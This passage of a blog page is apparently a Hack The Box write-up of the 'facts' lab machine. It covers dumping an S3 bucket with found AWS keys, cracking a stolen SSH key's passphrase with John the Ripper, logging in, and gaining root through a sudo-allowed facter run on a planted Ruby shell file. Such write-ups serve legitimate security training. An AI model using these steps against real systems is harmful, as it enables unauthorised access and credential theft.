+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# aws configure                                  
+</span></span><span style="display:flex;"><span>AWS Access Key ID: AKIA0BFCF1A5C7112990
+</span></span><span style="display:flex;"><span>AWS Secret Access Key: ei0GZaLK24JLkHyLJHMKRs3WsazqkDqUt+z0Jj+i
+</span></span><span style="display:flex;"><span>Default region name: us-east-1
+</span></span><span style="display:flex;"><span>Default output format <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Listing the buckets:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# aws --endpoint-url http://facts.htb:54321 s3 ls --recursive
+</span></span><span style="display:flex;"><span>2025-09-11 05:06:52 internal
+</span></span><span style="display:flex;"><span>2025-09-11 05:06:52 randomfacts</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The bucket I was really interested in was <em>internal</em>, so I dumped it:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/ ./internal_dump --recursive</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I looked through the dump and found a <strong>.ssh</strong> folder, which brought me one step closer to getting a foothold on the target machine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# cd internal_dump 
+</span></span><span style="display:flex;"><span>                                                           
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox/internal_dump<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ls -a
+</span></span><span style="display:flex;"><span>.   .bash_logout  .bundle  .lesshst  .ssh
+</span></span><span style="display:flex;"><span>..  .bashrc       .cache   .profile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox/internal_dump<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# cd .ssh         
+</span></span><span style="display:flex;"><span>                                                             
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox/internal_dump/.ssh<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ls   
+</span></span><span style="display:flex;"><span>authorized_keys  id_ed25519</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I cloned the <strong>id_ed25519</strong> SSH key, gave it permissions, and tested it out with the users <strong>trivia</strong> and <strong>william</strong>. The key ended up working for <strong>trivia</strong>, but required a passphrase.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh -i cloned_key trivia@facts.htb          
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;cloned_key&#39;</span>: </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I had to crack the passkey by using <strong>ssh2john</strong> to create a hash, then passing it to <strong>john the ripper</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh2john cloned_key &gt; cloned_key_hash.txt
+</span></span><span style="display:flex;"><span>                                                             
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# john cloned_key_hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt 
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>KDF/cipher <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>MD5/AES 1<span style="color:#f92672">=</span>MD5/3DES 2<span style="color:#f92672">=</span>Bcrypt/AES<span style="color:#f92672">])</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">24</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>dragonballz      <span style="color:#f92672">(</span>cloned_key<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:02:57 DONE <span style="color:#f92672">(</span>2026-05-12 15:45<span style="color:#f92672">)</span> 0.005645g/s 18.06p/s 18.06c/s 18.06C/s grecia..imissu
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Found the passphrase- <strong>dragonballz</strong>.</p>
+<h2 id="foothold" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>FOOTHOLD</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>With the passphrase successfully cracked, I was able to SSH into the target machine as the user, <strong>trivia</strong>.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh -i cloned_key trivia@facts.htb
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;cloned_key&#39;</span>: 
+</span></span><span style="display:flex;"><span>Last login: Wed Jan <span style="color:#ae81ff">28</span> 16:17:19 UTC <span style="color:#ae81ff">2026</span> from 10.10.14.4 on ssh
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 25.04 <span style="color:#f92672">(</span>GNU/Linux 6.14.0-37-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> System information as of Tue May <span style="color:#ae81ff">12</span> 10:53:40 PM UTC <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:           0.03
+</span></span><span style="display:flex;"><span>  Usage of /:            72.1% of 7.28GB
+</span></span><span style="display:flex;"><span>  Memory usage:          19%
+</span></span><span style="display:flex;"><span>  Swap usage:            0%
+</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">221</span>
+</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.53.63
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::a0de:adff:fec7:c0dd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>trivia@facts:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>trivia<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>trivia<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>trivia<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>First, I grabbed the user flag located in <strong>/home/william</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>trivia@facts:~$ cd /home/william
+</span></span><span style="display:flex;"><span>trivia@facts:/home/william$ cat user.txt
+</span></span><span style="display:flex;"><span>18a356a9ca5da53e609ac4766ddb6ecf</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I then internally enumerated the system to find privilege escalation vectors.<br>
+ <br>
+Running <strong>sudo -l</strong> showed something promising:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>trivia@facts:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> trivia on facts:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User trivia may run the following commands on facts:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/facter</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h2 id="privesc" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>PRIVESC</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>Seeing that <strong>trivia</strong> can use the <strong>facter</strong> bin with no password, I did some digging on <a href="https://gtfobins.org/gtfobins/facter/"><strong>GTFObins</strong></a> to figure out an exploit.<br>
+ <br>
+By running the following command, the first <strong>.rb</strong> file in the target directory would be executed:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>facter --custom-dir<span style="color:#f92672">=</span>/path/to/dir/ x</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>All that I had to do was create a malicious <strong>.rb</strong> file in a writeable directory to spawn a root shell. And so that&rsquo;s exactly what I did!</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>trivia@facts:~$ echo <span style="color:#e6db74">&#39;system(&#34;/bin/bash&#34;)&#39;</span> &gt; /tmp/gimmeroot.rb
+</span></span><span style="display:flex;"><span>trivia@facts:~$ sudo facter --custom-dir<span style="color:#f92672">=</span>/tmp x  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>root@facts:/home/trivia# </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Just like that, we successfully popped a root shell! I grabbed the flag at <strong>/root/root.txt</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@facts:/home/trivia# cd /root
+</span></span><span style="display:flex;"><span>root@facts:~# ls
+</span></span><span style="display:flex;"><span>minio-binaries  ministack  root.txt  snap
+</span></span><span style="display:flex;"><span>root@facts:~# cat root.txt
+</span></span><span style="display:flex;"><span>4d1e72146cfe282630337292c2b7df01</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h2 id="takeaways" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>TAKEAWAYS</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>I feel like this machine was very straightforward and reinforced both my web and internal enumeration skills. The Camaleon CMS vulnerability served as a great reminder for why it&rsquo;s always useful to check service versions during recon. The privesc technique I had to use to pop a root shell was also a great showcase of how powerful misconfigured SUID binaries can be for an attacker.</p>
+
+        </div>
+      </div>
+
+      
+    </article>
+
+    <div class="hidden lg:block col-span-2"></div>
+  </div>
+</main>
+
+      </div>
+
+    </div>
+  </main>
+
+  <footer>
+    <div class="border-t border-gray-800 bg-[#070709] text-gray-400">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6">
+    <div class="flex flex-col md:flex-row items-center justify-between py-6 space-y-4 md:space-y-0">
+
+      
+      <div class="text-sm sm:text-base md:text-lg">
+        <span class="relative inline-block">
+          © 2026 Esteban Pangelinan. All rights reserved. <br>
+          Made with <a href="https://gohugo.io" target="_blank">Hugo</a> | <a
+            href="https://github.com/Enerhim/enervoid-theme" target="_blank">Enervoid</a>
+        </span>
+      </div>
+
+      
+      <div class="flex items-center space-x-6 text-sm sm:text-base md:text-lg">
+
+        
+        <a href='https://github.com/est706' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-github-original"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+        <a href='https://www.linkedin.com/in/esteban-pangelinan-385249210/' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-linkedin-plain"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+
+      </div>
+    </div>
+  </div>
+</div>
+
+  </footer>
+</body>
+
+</html>
